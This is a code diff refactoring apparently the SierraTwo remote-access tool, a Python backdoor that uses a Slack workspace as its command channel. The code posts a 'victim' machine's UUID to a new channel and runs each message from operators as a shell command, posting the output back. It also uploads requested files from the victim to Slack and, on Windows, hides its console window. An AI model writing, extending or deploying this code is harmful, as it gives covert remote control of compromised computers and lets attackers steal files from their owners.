@@ -1,175 +1,247 @@
-import config
+#!/usr/bin/env python3
+import io
 import os
 import platform
-import slack
 import subprocess
 import sys
 import time
 
+import slack
 
-def run_c(input_c, sh_channel_id):
-    if input_c[:7] == "upload ":
-        try:
-            out = client.files_upload(file=input_c[7:],
-                                      channels=sh_channel_id,
-                                      filename=input_c[7:],
-                                      title=input_c[7:],
-                                      )
+import config
 
-            assert out["ok"]
+TEXT_SIZE_MAX = 3992
+CHUNKED_TEXT_SIZE_MAX = 3 * TEXT_SIZE_MAX
+TEXT_CHUNK_SIZE = TEXT_SIZE_MAX
 
-            return f"Uploaded {input_c[7:]}"
+FILE_SIZE_MAX = 10485760
 
-        except FileNotFoundError:
-            return "File not found."
-
-    elif input_c == "sh_exit":
-        sys.exit(0)
-
-    elif input_c[:3] == "cd ":
-        out = os.chdir(input_c[3:])
-        return "`cd` complete."
-
-    else:
-        try:
-            out = os.popen(input_c).read()
-
-        except:
-            print("OS POPEN exception!")
-
-        if out == "":
-            return "The command did not return anything."
-
-        else:
-            return f"```{out}```"
+channel_id = None
 
 
-def next_sh(channel_names):
+def prepare_shell():
+    global channel_id
+
+    # Get list of channels
+    channels_list = client.conversations_list()
+    channel_names = channels_list.__getitem__("channels")
+
+    # Create 'sierra-hotel-'
+    channel = create_channel(channel_names)
+
+    # Get channel name and ID
+    channel_id = channel.__getitem__("channel")["id"]
+
+    # Add operators to the 'sierra-hotel-'
+    client.conversations_invite(channel=channel_id,
+                                users=operators)
+
+    # Gather the victim's info and post it to 'sierra-hotel-'
+    info = machine_info()
+    client.chat_postMessage(channel=channel_id, text=info)
+
+    # Get the timestamp of the info message
+    history = client.conversations_history(channel=channel_id)
+    messages = history.__getitem__("messages")
+    timestamp = messages[0]["ts"]
+
+    # Pin the info message
+    client.pins_add(channel=channel_id, timestamp=timestamp)
+
+    listen()
+
+
+def create_channel(channel_names):
+    shell_number = next_channel(channel_names)
+
+    new_channel = f"{config.channel_prefix}{shell_number}"
+
+    return client.conversations_create(name=new_channel)
+
+
+def next_channel(channel_names):
     numbers = []
-    sh_num = 0
+    shell_number = 0
 
     try:
         for channel in channel_names:
-            current_sh_name = channel.get("name")
+            current_shell_name = channel.get("name")
 
-            if channel_prefix in channel.get("name"):
-                channel_number = channel.get("name").split("-")[2]
+            if config.channel_prefix in channel.get("name"):
+                next_channel = channel.get("name").split("-")[2]
 
-                if channel_number.isdigit():
-                    numbers.append(int(channel_number))
+                if next_channel.isdigit():
+                    numbers.append(int(next_channel))
 
-        return max(numbers) + 1
+        shell_number = max(numbers) + 1
 
     except ValueError:
-        return sh_num + 1
+        shell_number += 1
 
-    return sh_num
+    return shell_number
 
 
-def init_conn():
+def machine_info():
+    machine_UUID = ""
+
     if platform.system() == "Windows":
-        get_UUID = str(subprocess.check_output("wmic csproduct get UUID").decode().strip())
+        get_UUID = str(subprocess.check_output(
+            "wmic csproduct get UUID").decode().strip())
+
         for line in get_UUID:
             UUID = " ".join(get_UUID.split())
             machine_UUID = UUID[5:]
 
     elif platform.system() == "Linux":
-        machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
+        machine_UUID = str(subprocess.check_output(
+            ["cat", "/etc/machine-id"]).decode().strip())
 
     elif platform.system() == "Darwin":
-        machine_UUID = str(subprocess.check_output(["ioreg",
-                                                    "-d2",
-                                                    "-c",
-                                                    "IOPlatformExpertDevice",
-                                                    "|",
-                                                    "awk",
-                                                    "-F",
-                                                    "'/IOPlatformUUID/{print $(NF-1)}'"
-                                                    ])
-                           )
+        machine_UUID = str(
+            subprocess.check_output(["ioreg",
+                                     "-d2",
+                                     "-c",
+                                     "IOPlatformExpertDevice",
+                                     "|",
+                                     "awk",
+                                     "-F",
+                                     "'/IOPlatformUUID/{print $(NF-1)}'"]))
+
     else:
         machine_UUID = str("unknown")
 
-    sh_stdout = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
+    info = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
 
-    return sh_stdout
+    return info
 
 
-if platform.system() == "Windows":
+def upload(data):
+    try:
+        filename = data
+
+        client.chat_postMessage(channel=channel_id,
+                                text=f"Uploading `{filename}`, "
+                                "standby...")
+
+        client.files_upload(file=filename,
+                            channels=channel_id,
+                            filename=filename,
+                            title=filename,)
+
+        client.chat_postMessage(channel=channel_id,
+                                text=f"Uploaded `{filename}`.")
+
+    except FileNotFoundError:
+        return "File not found."
+
+
+def handle_user_input(command):
+    output = ""
+
+    try:
+        output = os.popen(command).read()
+
+    except:
+        client.chat_postMessage(channel=channel_id,
+                                text="Error reading command output.")
+
+    if output == "":
+        client.chat_postMessage(channel=channel_id,
+                                text="The command did not return anything.")
+
+    output_length = len(output)
+
+    if "`" in output:
+        client.chat_postMessage(channel=channel_id,
+                                text="Output contains an illegal "
+                                     "character.")
+
+    if 0 < output_length <= CHUNKED_TEXT_SIZE_MAX:
+        output = [output[i:i + TEXT_SIZE_MAX]
+                  for i in range(0, output_length, TEXT_SIZE_MAX)]
+
+        for page in output:
+            client.chat_postMessage(channel=channel_id,
+                                    text=f"```{page}```")
+
+    elif output_length > CHUNKED_TEXT_SIZE_MAX:
+        client.chat_postMessage(channel=channel_id,
+                                text="Output size is too big. If you "
+                                     "are trying to read a file, try "
+                                     "uploading it.")
+
+    else:
+        client.chat_postMessage(channel=channel_id, text="Unknown error.")
+
+
+def commands(command):
+    if command.startswith("upload"):
+        return upload(command.split(" ")[1])
+
+    elif command.startswith("cd"):
+        os.chdir(command.split(" ")[1])
+        client.chat_postMessage(channel=channel_id,
+                                text="`cd` complete.")
+
+    elif command.startswith("shell_exit"):
+        sys.exit(0)
+
+    else:
+        handle_user_input(command)
+
+
+def listen():
+    # SierraTwo will read the channel every 0.3 seconds
+    # and compare the past messages to the latest message.
+    # This is implemented here like this due to Slack's terrible API
+    message = ""
+    old_messages = ""
+    messages = "randomval"
+
+    while True:
+        # Get the channel history
+        history = client.conversations_history(channel=channel_id)
+        time.sleep(0.3)
+
+        # Get the messages from history
+        messages = history.__getitem__("messages")[0]
+
+        if old_messages == messages:
+            continue
+
+        else:
+            if "client_msg_id" in messages:
+                message = messages["text"]
+                machine_info = commands(message)
+
+                message = ""
+
+            old_messages = messages
+
+        time.sleep(0.3)
+
+
+def hide_process():
     import ctypes
     import pywintypes
     import win32process
 
     hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+
     if hwnd != 0:
         ctypes.windll.user32.ShowWindow(hwnd, 0)
         ctypes.windll.kernel32.CloseHandle(hwnd)
         _, pid = win32process.GetWindowThreadProcessId(hwnd)
-        os.system("taskkill /PID " + str(pid) + " /f")
+        os.system(f"taskkill /PID {pid} /f")
 
-    window = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(window, win32con.SW_HIDE)
-    op_user_ids = config.member_id
-    channel_prefix = config.channel_prefix
 
-op_user_ids = config.member_id
+if platform.system() == "Windows":
+    hide_process()
+
+
+operators = config.member_id
 channel_prefix = config.channel_prefix
 client = slack.WebClient(token=config.bot_user_oauth_token)
 
-channels_list = client.conversations_list()
-channel_names = channels_list.__getitem__("channels")
-
-# Calculate biggest sh number (create channels from where we left off)
-sh_num = next_sh(channel_names)
-
-sh_stdout = init_conn()
-
-new_channel_name = str(channel_prefix + str(sh_num))
-# client.conversations_close("sierra-hotel-5")
-
-# If UUID != any of the channels:
-create_response = client.conversations_create(name=new_channel_name, # List channels, give number to channels.
-                                            is_private=False, # Operator would need to be invited to the channel even if the op is the channel admin.
-                                            user_ids=op_user_ids # Set to true for a private channel.
-                                            )
-
-sh_channel = create_response.__getitem__("channel")
-sh_channel_id = sh_channel["id"]
-sh_channel_name = sh_channel["name"]
-
-# conversations.join - Use the user API to join the channel later
-client.conversations_join(channel=sh_channel_id)
-
-# Slack doesnt let us remove channels for now.
-time.sleep(1)
-
-response = client.chat_postMessage(channel=sh_channel_id, text=sh_stdout)
-assert response["ok"]
-# assert response["message"]["text"] == sh_stdout
-time.sleep(1)
-
-sh_comm = ""
-old_messages = ""
-messages = "randomval"
-
-while True:
-    sh_history = client.conversations_history(channel=sh_channel_id)
-    time.sleep(0.3)
-    messages = sh_history.__getitem__("messages")[0]
-
-    if old_messages == messages:
-        continue
-
-    else:
-        if "client_msg_id" in messages:
-            sh_comm = messages["text"]
-            sh_stdout = run_c(sh_comm, sh_channel_id)
-
-            response = client.chat_postMessage(channel=sh_channel_id, text=sh_stdout)
-            assert response["ok"]
-
-            sh_comm = ""
-
-        old_messages = messages
-
-    time.sleep(0.3)
+if __name__ == "__main__":
+    prepare_shell()
